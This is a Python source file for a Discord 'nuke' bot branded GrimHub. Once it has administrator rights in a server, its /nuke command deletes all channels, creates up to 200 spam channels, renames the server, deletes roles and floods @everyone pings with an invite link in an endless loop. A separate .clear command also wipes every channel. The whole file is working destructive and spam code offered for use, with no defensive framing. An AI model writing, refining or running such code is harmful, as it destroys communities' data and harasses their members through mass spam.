import discord
from discord.ext import commands
import asyncio
import os

TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

active_nuke = {}

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ GrimHub Nuke Bot ready - {bot.user}")

@bot.tree.command(name="nuke", description="NUKE THE SERVER")
async def nuke(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ You don't have permission.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    await interaction.response.send_message("**🔥 SERVER NUKE INITIATED 🔥**", ephemeral=False)
    
    guild = interaction.guild
    active_nuke[guild.id] = True
    
    message = "**NUKED BY GRIMHUB**\nhttps://discord.gg/keW3WFQaqp"
    ping_text = "@everyone "
    
    try:
        # Delete all channels
        delete_tasks = [channel.delete() for channel in guild.channels]
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        await asyncio.sleep(0.5)
        
        # Create 200 spam channels
        spam_channels = []
        for i in range(200):
            if not active_nuke.get(guild.id):
                break
            try:
                channel = await guild.create_text_channel(f"nuked-by-grimhub")
                spam_channels.append(channel)
            except:
                pass
        
        # Rename server
        await guild.edit(name="🔥 NUKED BY GRIMHUB 🔥")
        
        # Delete all roles
        for role in guild.roles:
            if not role.is_default() and not role.managed and role != guild.me.top_role:
                try:
                    await role.delete()
                except:
                    pass
        
        # SPAM FOREVER
        while active_nuke.get(guild.id):
            for channel in spam_channels:
                if not active_nuke.get(guild.id):
                    break
                try:
                    await channel.send(f"{ping_text}{message}")
                except:
                    pass
            await asyncio.sleep(0.01)
        
    except Exception as e:
        print(f"Nuke error: {e}")
    finally:
        active_nuke[guild.id] = False

@bot.tree.command(name="stop", description="Stop the nuke")
async def stop_nuke(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the owner can stop the nuke.", ephemeral=True)
    
    if interaction.guild.id in active_nuke:
        active_nuke[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Nuke stopped**", ephemeral=False)
    else:
        await interaction.response.send_message("No active nuke.", ephemeral=True)

@bot.command(name="clear")
async def clear_all(ctx):
    """Delete all channels and create one called HI"""
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Only the owner can use this.")
    
    if not ctx.guild.me.guild_permissions.administrator:
        return await ctx.send("❌ Bot needs Administrator permission.")
    
    await ctx.send("**🔥 CLEARING ALL CHANNELS... 🔥**")
    
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.05)
        except:
            pass
    
    await ctx.guild.create_text_channel("HI")
    await ctx.guild.edit(name="🔥 NUKED BY GRIMHUB 🔥")

@bot.command(name="commands")
async def bot_commands(ctx):
    await ctx.send("""
**GrimHub Nuke Bot**

`.clear` - Delete all channels, create one called HI
`/nuke` - FULL SERVER NUKE
`/stop` - Stop the nuke
""")

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
